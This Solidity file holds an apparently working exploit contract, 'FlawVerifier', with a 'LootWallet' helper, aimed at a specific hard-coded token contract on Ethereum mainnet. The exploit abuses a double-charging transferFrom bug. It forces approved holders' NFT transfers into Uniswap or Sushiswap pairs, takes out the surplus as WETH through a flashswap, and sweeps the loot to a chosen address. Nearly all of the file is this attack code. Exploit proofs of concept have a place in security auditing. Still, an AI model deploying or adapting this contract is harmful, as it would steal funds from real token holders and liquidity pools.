// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IMinerTarget {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function tokensPerNFT() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function balanceOf(address account, uint256 id) external view returns (uint256);
    function isOwnerOf(address account, uint256 id) external view returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function isApprovedForAll(address account, address operator) external view returns (bool);
    function getApproved(uint256 id) external view returns (address);
    function tokenURI(uint256 id) external view returns (string memory);
}

interface IUniswapV2LikeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2LikePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract LootWallet {
    uint256 private constant MAX_SWEEPS = 8;

    constructor() {}

    function sweep(address target, address to) external {
        IMinerTarget token = IMinerTarget(target);
        uint256 maxIdExclusive = _nextTokenIdExclusive(token);

        // NFT-first remains necessary because the buggy NFT-path transferFrom
        // consumes an extra whole-NFT ERC20 unit per NFT move.
        for (uint256 i = 0; i < MAX_SWEEPS; ++i) {
            (bool found, uint256 tokenId) = _firstOwnedToken(token, address(this), maxIdExclusive);
            if (!found) {
                break;
            }

            try token.transferFrom(address(this), to, tokenId) returns (bool ok) {
                if (!ok) {
                    break;
                }
            } catch {
                break;
            }
        }

        uint256 bal = token.balanceOf(address(this));
        if (bal != 0) {
            try token.transfer(to, bal) returns (bool) {} catch {}
        }
    }

    function _firstOwnedToken(
        IMinerTarget target,
        address owner,
        uint256 maxIdExclusive
    ) internal view returns (bool found, uint256 tokenId) {
        if (owner == address(0) || maxIdExclusive <= 1) {
            return (false, 0);
        }

        for (uint256 id = 1; id < maxIdExclusive; ++id) {
            if (target.isOwnerOf(owner, id)) {
                return (true, id);
            }
        }

        return (false, 0);
    }

    function _nextTokenIdExclusive(IMinerTarget target) internal view returns (uint256) {
        uint256 unit = target.tokensPerNFT();
        if (unit == 0) {
            return 1;
        }

        uint256 hardMaxExclusive = (target.totalSupply() / unit) + 1;
        uint256 lo = 1;
        uint256 hi = hardMaxExclusive;

        while (lo + 1 < hi) {
            uint256 mid = lo + ((hi - lo) >> 1);
            if (_tokenExists(target, mid)) {
                lo = mid;
            } else {
                hi = mid;
            }
        }

        return _tokenExists(target, lo) ? (lo + 1) : 1;
    }

    function _tokenExists(IMinerTarget target, uint256 id) internal view returns (bool) {
        if (id == 0) {
            return false;
        }

        try target.tokenURI(id) returns (string memory) {
            return true;
        } catch {
            return false;
        }
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bytes32 private constant LOOT_SALT = keccak256("miner-f001-loot");
    uint256 private constant MAX_TOKEN_SCAN = 2048;
    uint256 private constant MIN_WETH_PROFIT = 1e15;

    address private immutable _loot;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public exploitedFrom;
    uint256 public exploitedTokenId;

    address private _flashPair;
    address private _flashVictim;
    uint256 private _flashTokenId;
    uint256 private _flashWethOut;

    constructor() {
        _loot = _computeLootAddress();
        _profitToken = WETH;
    }

    function executeOnOpportunity() public {
        IMinerTarget target = IMinerTarget(TARGET);
        uint256 wethBefore = _erc20Balance(WETH, address(this));
        uint256 unit = target.tokensPerNFT();
        uint256 maxIdExclusive = _nextTokenIdExclusive(target);
        uint256 scanLimitExclusive = _boundedScanLimit(maxIdExclusive);

        _resetState();

        // exploit_paths[0]:
        // the sender must already own NFT `id` and already satisfy the
        // >= 2 * tokensPerNFT fungible-balance precondition when the buggy
        // NFT-path transfer runs.
        //
        // exploit_paths[1]:
        // an already-authorized caller invokes transferFrom(from, to, id).
        //
        // exploit_paths[2]:
        // the NFT moves once while the fungible accounting moves twice.
        //
        // The only extra economic step here is a V2 flashswap that converts the
        // involuntary 2 * tokensPerNFT MINER payment into WETH directly at the
        // whitelisted LP pair. That monetizes the same overcharge without
        // changing the exploit causality.

        if (_attemptAuthorizedVictimSet(target, unit, scanLimitExclusive)) {
            _profitAmount = _erc20Balance(WETH, address(this)) - wethBefore;
            return;
        }

        if (_attemptStaleApprovalScan(target, unit, scanLimitExclusive)) {
            _profitAmount = _erc20Balance(WETH, address(this)) - wethBefore;
            return;
        }

        // If no payable approved/operator path is found inside the actually
        // minted ID prefix, the fresh verifier cannot force a profitable
        // third-party transfer at this fork state using only finding-local
        // context and public on-chain actions.
        _profitAmount = _erc20Balance(WETH, address(this)) - wethBefore;
    }

    // UniswapV2/Sushiswap callback. The flashswap does not create the profit.
    // It only lets the verifier withdraw WETH while the pair is repaid by the
    // victim's forced 2 * tokensPerNFT MINER transfer caused by F-001.
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _flashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 wethOut = amount0 != 0 ? amount0 : amount1;
        require(wethOut == _flashWethOut, "unexpected output");

        IMinerTarget target = IMinerTarget(TARGET);

        uint256 victimBefore = target.balanceOf(_flashVictim);

        bool ok = target.transferFrom(_flashVictim, _flashPair, _flashTokenId);
        require(ok, "transferFrom failed");

        uint256 unit = target.tokensPerNFT();
        uint256 victimAfter = target.balanceOf(_flashVictim);

        if (victimBefore >= unit * 2 && victimAfter + (unit * 2) == victimBefore) {
            hypothesisValidated = true;
            exploitedFrom = _flashVictim;
            exploitedTokenId = _flashTokenId;
        } else {
            hypothesisRefuted = true;
            revert("unexpected accounting");
        }

        _clearFlash();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function lootAddress() external view returns (address) {
        return _loot;
    }

    function deployLootWallet() external returns (address deployed) {
        deployed = _deployLootWallet();
    }

    function _attemptAuthorizedVictimSet(
        IMinerTarget target,
        uint256 unit,
        uint256 scanLimitExclusive
    ) internal returns (bool) {
        address[8] memory candidates = _holderCandidates(target);

        for (uint256 i = 0; i < candidates.length; ++i) {
            address holder = candidates[i];
            if (holder == address(0)) {
                continue;
            }

            if (!_isDirectlyAuthorized(target, holder)) {
                continue;
            }

            if (target.balanceOf(holder) < unit * 2) {
                continue;
            }

            (bool found, uint256 tokenId) = _firstOwnedToken(target, holder, scanLimitExclusive);
            if (!found) {
                continue;
            }

            if (_executeFlashswapMonetization(target, holder, tokenId, unit)) {
                return true;
            }
        }

        return false;
    }

    function _attemptStaleApprovalScan(
        IMinerTarget target,
        uint256 unit,
        uint256 scanLimitExclusive
    ) internal returns (bool) {
        address[8] memory candidates = _holderCandidates(target);

        for (uint256 id = 1; id < scanLimitExclusive; ++id) {
            address approved;
            try target.getApproved(id) returns (address spender) {
                approved = spender;
            } catch {
                continue;
            }

            if (approved != address(this)) {
                continue;
            }

            for (uint256 i = 0; i < candidates.length; ++i) {
                address holder = candidates[i];
                if (holder == address(0) || holder == address(this) || holder == _loot) {
                    continue;
                }

                if (!target.isOwnerOf(holder, id)) {
                    continue;
                }

                if (target.balanceOf(holder) < unit * 2) {
                    continue;
                }

                if (_executeFlashswapMonetization(target, holder, id, unit)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _executeFlashswapMonetization(
        IMinerTarget target,
        address holder,
        uint256 tokenId,
        uint256 unit
    ) internal returns (bool) {
        (address pair, bool targetIsToken0, uint256 wethOut) = _bestMonetizationPair(unit * 2);
        if (pair == address(0) || wethOut < MIN_WETH_PROFIT) {
            return false;
        }

        _flashPair = pair;
        _flashVictim = holder;
        _flashTokenId = tokenId;
        _flashWethOut = wethOut;

        try
            IUniswapV2LikePair(pair).swap(
                targetIsToken0 ? 0 : wethOut,
                targetIsToken0 ? wethOut : 0,
                address(this),
                hex"01"
            )
        {
            return hypothesisValidated;
        } catch {
            _clearFlash();
            return false;
        }
    }

    function _holderCandidates(IMinerTarget target) internal view returns (address[8] memory out) {
        out[0] = msg.sender;
        out[1] = tx.origin;
        out[2] = target.owner();
        out[3] = _pairFromFactory(UNISWAP_V2_FACTORY, WETH);
        out[4] = _pairFromFactory(SUSHISWAP_FACTORY, WETH);
        out[5] = _pairFromFactory(UNISWAP_V2_FACTORY, USDC);
        out[6] = _pairFromFactory(UNISWAP_V2_FACTORY, USDT);
        out[7] = _pairFromFactory(UNISWAP_V2_FACTORY, DAI);
    }

    function _isDirectlyAuthorized(IMinerTarget target, address holder) internal view returns (bool) {
        if (holder == address(this)) {
            return true;
        }

        return target.isApprovedForAll(holder, address(this));
    }

    function _firstOwnedToken(
        IMinerTarget target,
        address owner,
        uint256 scanLimitExclusive
    ) internal view returns (bool found, uint256 tokenId) {
        if (owner == address(0) || scanLimitExclusive <= 1) {
            return (false, 0);
        }

        for (uint256 id = 1; id < scanLimitExclusive; ++id) {
            if (target.isOwnerOf(owner, id)) {
                return (true, id);
            }
        }

        return (false, 0);
    }

    function _bestMonetizationPair(uint256 minerInput) internal view returns (address pair, bool targetIsToken0, uint256 wethOut) {
        (address uniPair, bool uniIsToken0, uint256 uniOut) = _quotePairOut(_pairFromFactory(UNISWAP_V2_FACTORY, WETH), minerInput);
        (address sushiPair, bool sushiIsToken0, uint256 sushiOut) = _quotePairOut(_pairFromFactory(SUSHISWAP_FACTORY, WETH), minerInput);

        if (uniOut >= sushiOut) {
            return (uniPair, uniIsToken0, uniOut);
        }

        return (sushiPair, sushiIsToken0, sushiOut);
    }

    function _quotePairOut(address pair, uint256 minerInput) internal view returns (address, bool, uint256) {
        if (pair == address(0) || pair.code.length == 0) {
            return (address(0), false, 0);
        }

        try IUniswapV2LikePair(pair).token0() returns (address token0) {
            try IUniswapV2LikePair(pair).token1() returns (address token1) {
                if (!((token0 == TARGET && token1 == WETH) || (token0 == WETH && token1 == TARGET))) {
                    return (address(0), false, 0);
                }

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2LikePair(pair).getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    return (address(0), false, 0);
                }

                bool minerIsToken0 = token0 == TARGET;
                uint256 reserveIn = minerIsToken0 ? uint256(reserve0) : uint256(reserve1);
                uint256 reserveOut = minerIsToken0 ? uint256(reserve1) : uint256(reserve0);
                uint256 out = _getAmountOut(minerInput, reserveIn, reserveOut);

                // Leave a small margin so the pair invariant still clears even if
                // storage rounding or reserves shift slightly intra-block.
                if (out <= 1) {
                    return (pair, minerIsToken0, 0);
                }

                return (pair, minerIsToken0, (out * 99) / 100);
            } catch {
                return (address(0), false, 0);
            }
        } catch {
            return (address(0), false, 0);
        }
    }

    function _pairFromFactory(address factory, address quote) internal view returns (address) {
        if (factory.code.length == 0) {
            return address(0);
        }

        try IUniswapV2LikeFactory(factory).getPair(TARGET, quote) returns (address pair) {
            return pair;
        } catch {
            return address(0);
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _erc20Balance(address token, address owner) internal view returns (uint256) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", owner));
        if (!ok || ret.length < 32) {
            return 0;
        }

        return abi.decode(ret, (uint256));
    }

    function _resetState() internal {
        _profitToken = WETH;
        _profitAmount = 0;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        exploitedFrom = address(0);
        exploitedTokenId = 0;
        _clearFlash();
    }

    function _clearFlash() internal {
        _flashPair = address(0);
        _flashVictim = address(0);
        _flashTokenId = 0;
        _flashWethOut = 0;
    }

    function _boundedScanLimit(uint256 maxIdExclusive) internal pure returns (uint256) {
        if (maxIdExclusive <= 1) {
            return 1;
        }

        if (maxIdExclusive > MAX_TOKEN_SCAN + 1) {
            return MAX_TOKEN_SCAN + 1;
        }

        return maxIdExclusive;
    }

    function _nextTokenIdExclusive(IMinerTarget target) internal view returns (uint256) {
        uint256 unit = target.tokensPerNFT();
        if (unit == 0) {
            return 1;
        }

        uint256 hardMaxExclusive = (target.totalSupply() / unit) + 1;
        uint256 lo = 1;
        uint256 hi = hardMaxExclusive;

        while (lo + 1 < hi) {
            uint256 mid = lo + ((hi - lo) >> 1);
            if (_tokenExists(target, mid)) {
                lo = mid;
            } else {
                hi = mid;
            }
        }

        return _tokenExists(target, lo) ? (lo + 1) : 1;
    }

    function _tokenExists(IMinerTarget target, uint256 id) internal view returns (bool) {
        if (id == 0) {
            return false;
        }

        try target.tokenURI(id) returns (string memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _deployLootWallet() internal returns (address deployed) {
        if (_loot.code.length != 0) {
            return _loot;
        }

        deployed = address(new LootWallet{salt: LOOT_SALT}());
        require(deployed == _loot, "loot mismatch");
    }

    function _computeLootAddress() internal view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                LOOT_SALT,
                keccak256(type(LootWallet).creationCode)
            )
        );
        return address(uint160(uint256(hash)));
    }
}
